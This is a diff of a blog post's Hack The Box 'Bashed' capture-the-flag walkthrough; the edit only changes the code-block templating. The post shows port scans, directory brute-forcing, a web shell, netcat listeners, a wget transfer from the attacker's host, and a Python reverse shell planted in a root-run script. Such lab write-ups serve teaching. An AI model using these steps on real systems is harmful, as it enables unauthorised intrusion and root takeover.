@@ -27,8 +27,7 @@ Time to smash the Bashed.
 
 Run nmap to get a list of available ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.68             
 [sudo] password for kali: 
@@ -53,14 +52,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all of the ports to get any potentially hidden services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.68               
 [sudo] password for kali: 
@@ -72,8 +70,8 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Check the landing page that is being served on the web server.
@@ -96,8 +94,7 @@ Check the one post that is displayed on the landing page.  That looks interestin
 <br />
 Run the ffuf to try and brute-force directories.
 
-{% raw %}
-```sh
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.68/FUZZ -e .txt,.bak,.php -fs 7743
 
@@ -135,8 +132,8 @@ fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration:
 .php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 18ms]
 server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 28ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the /dev directory and notice the phpbash.php.
@@ -159,14 +156,13 @@ Check the phpbash.php and run whoami to confirm code execution.
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startfirstlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ sudo nc -nlvp 443                           
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startfirstlistener %}
 
 <br />
 Use revshells to generate a payload.
@@ -180,8 +176,7 @@ Use revshells to generate a payload.
 <br />
 Check the netcat listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchfoothold %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ sudo nc -nlvp 443                           
 [sudo] password for kali: 
@@ -189,14 +184,13 @@ listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.68] 52940
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 python3 -c 'import pty; pty.spawn("/bin/bash");
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchfoothold %}
 
 <br />
 Run sudo -l to get the list of all the commands that the user can run as sudo.
 
-{% raw %}
-```sh
+{% capture sudol %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ sudo nc -nlvp 443                           
 [sudo] password for kali: 
@@ -212,14 +206,13 @@ Matching Defaults entries for www-data on bashed:
 
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 www-data@bashed
 :/var/www/html/dev# cat /home/arrexel/user.txt
 
@@ -241,25 +234,23 @@ www-data@bashed
        valid_lft 86398sec preferred_lft 14398sec
     inet6 fe80::250:56ff:feb9:6930/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run whoami using the sudo as scriptmanger just to test the command execution.
 
-{% raw %}
-```sh
+{% capture testcommandexecution %}
 www-data@bashed:/dev/shm$ sudo -i -u scriptmanager whoami
 sudo -i -u scriptmanager whoami
 scriptmanager
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=testcommandexecution %}
 
 <br />
 List the files on the root directory.  Notice the /scripts folder owned by the user that we have sudo privs to execute.
 
-{% raw %}
-```sh
+{% capture checkrootfolder %}
 www-data@bashed:/dev/shm$ ls -la /
 ls -la /
 total 92
@@ -289,14 +280,13 @@ drwxrwxrwt  10 root          root           4096 Jan 28 06:15 tmp
 drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
 drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
 lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkrootfolder %}
 
 <br />
 As the scriptmanager, ls said scripts folder.
 
-{% raw %}
-```sh
+{% capture checkperms %}
 www-data@bashed:/dev/shm$ sudo -i -u scriptmanager ls -la /scripts
 sudo -i -u scriptmanager ls -la /scripts
 total 16
@@ -304,37 +294,40 @@ drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
 drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
 -rw-r--r--  1 root          root            12 Jan 28 06:16 test.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkperms %}
 
 <br />
 Check the contents of the test.py file.
 
-{% raw %}
-```sh
+{% capture cattest %}
 sudo -i -u scriptmanager cat /scripts/test.py
+{% endcapture %}
+
+{% capture origtestpy %}
 f = open("test.txt", "w")
 f.write("testing 123!")
 f.close
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=cattest %}
+
+{% include terminal.html language='python' title='python' content=origtestpy %}
 
 <br />
 Start a second netcat listener.
 
-{% raw %}
-```sh
+{% capture startseclistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ nc -nlvp 4444                             
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startseclistener %}
 
 <br />
 Create a new test.py file to create a reverse shell.
 
-{% raw %}
-```python
+{% capture testpy %}
 import socket
 import subprocess
 import os
@@ -346,25 +339,23 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("sh")
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='python' content=testpy %}
 
 <br />
 Create a python server to serve the test.py.
 
-{% raw %}
-```sh
+{% capture startpyserver %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startpyserver %}
 
 <br />
 Transfer the test.py to the victim machine.
 
-{% raw %}
-```sh
+{% capture transfertest %}
 www-data@bashed:/dev/shm$ wget http://10.10.16.12:8000/test.py
 wget http://10.10.16.12:8000/test.py
 --2025-01-28 06:33:24--  http://10.10.16.12:8000/test.py
@@ -376,26 +367,24 @@ Saving to: 'test.py'
 test.py             100%[===================>]     219  --.-KB/s    in 0.001s  
 
 2025-01-28 06:33:24 (320 KB/s) - 'test.py' saved [219/219]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transfertest %}
 
 <br />
 Try moving the file to overwrite the /scripts/test.py.  Notice that there was an error that states that the operation is not permitted.
 
-{% raw %}
-```sh
+{% capture startrootlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ sudo nc -nlvp 443                           
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startrootlistener %}
 
 <br />
 As I was trying to figure out what to do about that error, I checked the error and noticed that I caught a shell.
 
-{% raw %}
-```sh
+{% capture catchrootshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/bashed]
 └─$ nc -nlvp 4444                             
 listening on [any] 4444 ...
@@ -404,14 +393,13 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.10.68] 46880
 whoami
 root
 #
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchrootshell %}
 
 <br />
 Get the root.txt file.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 # cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -431,8 +419,8 @@ ip a
        valid_lft 86395sec preferred_lft 14395sec
     inet6 fe80::250:56ff:feb9:6930/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that we bashed another box.
